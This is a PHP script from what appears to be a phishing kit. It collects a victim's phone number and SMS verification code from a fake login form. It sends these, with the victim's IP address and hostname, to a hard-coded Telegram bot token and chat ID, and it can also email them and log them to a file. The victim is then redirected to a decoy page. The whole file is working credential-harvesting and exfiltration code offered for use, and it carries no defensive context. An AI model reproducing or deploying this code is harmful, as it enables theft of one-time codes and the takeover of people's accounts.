<?php
//-------- by me  --------///
//------ errore--------:::
error_reporting(E_ALL);
header('Content-type: text/html; charset-UTF-8');
date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
//----------iclude ---------//
/*include 'func.php';*/
session_start();
//------- verify-------------//
if (!isset($_POST['pu-tel']) || $_POST['pu-tel']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-login';</script>");
}
if (!isset($_POST['put-sms']) || $_POST['put-sms']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}
//------------variable ----------//
$pss = $_POST['put-sms'];
$eml = $_POST['pu-tel'];

//echo $eml." ".$pss;

date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");include 'Email.php';$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";$to = $Your_Email;$from = "bodabikola@websitefr.com";$headers = "From:" . $from;$subj = "Nnew Num & SMS SG by bikola : $ip";
    $data = "
+======================$subj======================+
|  Information Nm & sms by bikola              
| Num  : $eml
| SMS   : $pss
+===================================================================+
| Information Victim                              
$VictimInfo                                       
|    powered by bikola                        
+===================================================================+";
$token = "1163052470:AAEj8yZSnqn5xrsPeRiqGLRAfcTHsOx0nMI";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1239437517&text=" . urlencode($data)."" );
if($Save_Log==1) { $file = fopen("SWA.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { mail($to,$subj,$data,$headers); };
/*echo $eml." / ".$pss;*/
	die("<script type='text/javascript'>top.location = 'active.html';</script>");
	

?>